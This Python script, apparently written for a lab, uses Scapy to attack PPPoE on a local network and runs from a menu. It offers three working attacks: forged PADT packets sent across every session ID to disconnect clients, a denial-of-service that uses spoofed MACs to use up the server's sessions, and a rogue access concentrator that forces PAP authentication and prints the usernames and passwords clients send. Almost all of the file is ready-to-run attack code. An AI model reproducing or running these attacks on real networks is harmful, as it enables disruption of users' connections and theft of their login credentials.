#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.ppp import PPPoE

# define a broadcast address which should be used in dos attack - second attack
broadcast = "ff:ff:ff:ff:ff:ff"

End_Of_List = "\x00\x00"
Service_Name = "\x01\x01"
AC_Name = "\x01\x02"
Host_Uniq = "\x01\x03"
AC_Cookie = "\x01\x04"
Vendor_Specific = "\x01\x05"
Relay_Session_Id = "\x01\x10"
Service_Name_Error = "\x02\x01"
AC_System_Error = "\x02\x02"
Generic_Error = "\x02\x03"

service_name = ""
ac_name = "2014212884"
generic_error = "RP-PPPoE: Child pppd process terminated"

PADI = 0x09
PADO = 0x07
PADR = 0x19
PADS = 0x65
PADT = 0xa7

LCP = 0xc021
PAP = 0xc023
CHAP = 0xc223

Configure_Request = 1
Configure_Ack = 2
Configure_Nak = 3
Configure_Reject = 4
Terminate_Request = 5
Terminate_Ack = 6
Code_Reject = 7
Protocol_Reject = 8
Echo_Request = 9
Echo_Reply = 10
Discard_Reques = 11


# Generate a two byte representation of the provided number
def word(value):
    return chr((value / 256) % 256) + chr(value % 256)


# Generate a TLV for a variable length string
def TLV(type, value):
    return type + word(len(value)) + value


# Method to get a value of a tag from load
def get_value(payload, tag):
    loc = 0
    while loc < len(payload):
        att_type = payload[loc:loc + 2]
        att_len = (256 * ord(payload[loc + 2:loc + 3])) + ord(payload[loc + 3:loc + 4])
        if att_type == tag:
            return payload[loc + 4:loc + 4 + att_len]
        loc = loc + 4 + att_len


# Define a mac address which associated with second dos attack
def mac():
    random_mac = ["08", "00", "27",
                  str(random.randint(10, 99)), str(random.randint(10, 99)), str(random.randint(10, 99))]
    mac_address = ":".join(random_mac)
    return mac_address


def get_user_pwd(pkt):
    user_length = ord(str(pkt[PPP][1:2])[4])
    user = str(pkt[PPP][1:2])[5:5+user_length]
    pwd_length = ord(str(pkt[PPP][1:2])[5+user_length])
    pwd = str(pkt[PPP][1:2])[6+user_length:6+user_length+pwd_length]
    return user, pwd


# PPPoE Discovery # PADI PADO PADR 0x0000
def pppoed_packet(src, dst, code, sessionid=0x0000, service_name="", ac_name="", host_uniq="", ac_cookie=""):
    ether = Ether(src=src, dst=dst, type=0x8863)
    if code == PADI:  # Client --> Server
        return ether / PPPoED(code=PADI) / Raw(load=TLV(Service_Name, service_name) + TLV(Host_Uniq, host_uniq))
    elif code == PADO:  # Server --> Client
        return ether / PPPoED(code=PADO) / Raw(
            load=TLV(Service_Name, service_name) + TLV(AC_Name, ac_name) + TLV(Host_Uniq, host_uniq) + TLV(AC_Cookie,
                                                                                                           ac_cookie))
    elif code == PADR:  # Client --> Server
        return ether / PPPoED(code=PADR) / Raw(
            load=TLV(Service_Name, service_name) + TLV(Host_Uniq, host_uniq) + TLV(AC_Cookie, ac_cookie))
    elif code == PADS:  # Server --> Client
        return ether / PPPoED(code=PADS, sessionid=sessionid) / Raw(
            load=TLV(Service_Name, service_name) + TLV(Host_Uniq, host_uniq))
    elif code == PADT:  # Server --> Client
        return ether / PPPoED(code=PADT, sessionid=sessionid) / Raw(load=TLV(Generic_Error, generic_error))
    else:
        return ether / PPPoED()


# PPP LCP # Configuration Request
def lcp_req_packet(src, dst, sessionid, id, magic_number):
    ether = Ether(src=src, dst=dst, type=0x8864)
    pppoe = PPPoE(sessionid=sessionid)
    ppp = PPP(proto=LCP)
    ppp_mru = PPP_LCP_MRU_Option(max_recv_unit=1492)
    ppp_auth = PPP_LCP_Auth_Protocol_Option(auth_protocol=PAP)
    ppp_magic = PPP_LCP_Magic_Number_Option(magic_number=magic_number)
    ppp_lcp = PPP_LCP(code=1, id=id, data=(Raw(ppp_mru) / Raw(ppp_auth) / Raw(ppp_magic)))
    return ether / pppoe / ppp / ppp_lcp


def lcp_ack_packet(src, dst, sessionid, id, magic_number):
    ether = Ether(src=src, dst=dst, type=0x8864)
    pppoe = PPPoE(sessionid=sessionid)
    ppp = PPP(proto=LCP)
    ppp_mru = PPP_LCP_MRU_Option(max_recv_unit=1492)
    ppp_magic = "\x05\x06" + magic_number
    ppp_lcp = PPP_LCP(code=2, id=id, data=(Raw(ppp_mru) / ppp_magic))
    return ether / pppoe / ppp / ppp_lcp


# Do the first attack - prevent establishing the PPPoE connection
def client_attack(server_mac):
    while True:
        try:
            packet = sniff(count=1, filter="pppoed", iface="enp0s8")[0]
            if packet[PPPoED].code == PADI:
                for i in range(65535):
                    sendp(pppoed_packet(src=server_mac, dst=packet[Ether].src, code=PADT, sessionid=i), iface="enp0s8")
                print("We have attacked one host. Mac address: " + packet[Ether].src)
        except Exception as e:
            continue


# Use different mac address to attack server which lure it to use all the session-id - dos attack
def dos_attack(server_mac):
    while True:
        try:
            random_mac = mac()
            packet = srp1(pppoed_packet(src=random_mac, dst=broadcast, code=PADI), filter="pppoed", iface="enp0s8")
            if (packet[PPPoED].code == PADO) and (packet[Ether].src == server_mac) and (
                    packet[Ether].dst == random_mac):
                print(random_mac + " --> " + server_mac)
                ac_cookie = get_value(packet.load, AC_Cookie)
                sendp(pppoed_packet(src=random_mac, dst=server_mac, code=PADR, ac_cookie=ac_cookie), iface="enp0s8")
        except Exception as e:
            continue


def lure_attack():
    while True:
        # Wait PPPoED-PADI
        fake_mac = mac()
        packet = sniff(count=1, filter="pppoed", iface="enp0s8")[0]
        if packet[PPPoED].code == PADI:
            # Send PPPoED-PADO
            ac_cookie = os.urandom(20)
            host_uniq = get_value(packet.load, Host_Uniq)
            sessionid = 0x0005
            srp1(pppoed_packet(src=fake_mac, dst=packet[Ether].src, code=PADO, service_name=service_name,
                               ac_name=ac_name, host_uniq=host_uniq, ac_cookie=ac_cookie),
                 filter="pppoed", iface="enp0s8")
            # Send PPPoED-PADS
            sendp(pppoed_packet(src=fake_mac, dst=packet[Ether].src, code=PADS, sessionid=sessionid,
                                service_name=service_name, host_uniq=host_uniq), iface="enp0s8")

            print("before lcp packet")
            # Send PPP-LCP and receive PPP-PAP
            magic_number = 0x12345678
            my_req = lcp_req_packet(src=fake_mac, dst=packet[Ether].src, sessionid=sessionid, id=1,
                                    magic_number=magic_number)
            sendp(my_req, iface="enp0s8")
            while True:
                client_req = sniff(count=1, filter="pppoes", iface="enp0s8")[0]
                print("Got req")
                # Configuration Request
                if PPP in client_req and client_req[PPP].proto == LCP:
                    print("LCP")
                    if str(client_req[PPP][1:2])[0] == "\x01":
                        print("Code 1")
                        sendp(lcp_ack_packet(src=fake_mac, dst=packet[Ether].src, sessionid=sessionid, id=1,
                                             magic_number=str(client_req[PPP][1:2])[10:14]), iface="enp0s8")
                        break
            while True:
                client_pap = sniff(count=1, filter="pppoes", iface="enp0s8")[0]
                # PAP Request
                if PPP in client_pap and client_pap[PPP].proto == PAP:
                    print("Got PAP")
                    # Read username and password
                    hexdump(client_pap)
                    user, pwd = get_user_pwd(client_pap)
                    print("Username: "+user)
                    print("Password: "+pwd)
                    return


# get the mac address of PPPoE server which is used for first attack
# test = srp1(pppoed_packet(src=my_mac, dst=broadcast, code=PADI), iface="enp0s8")
server_mac = "08:00:27:42:bf:93"

# Menu
print('*' * 30)
print('Tips: If you want to stop the program, you should press Ctrl+Z.')
print('1. Send PADT to cut off connection')
print('2. Dos attack')
print('3. Lure attack')
print('*' * 30)

while True:
    choice = input('Now make you choice <1-3>: ')
    if choice != 1 and choice != 2 and choice != 3:
        print('Your choice is wrong. Please input right choice.')
    else:
        break

print('Now the attack will be beginning...')

if choice == 1:
    client_attack(server_mac)
elif choice == 2:
    dos_attack(server_mac)
elif choice == 3:
    lure_attack()
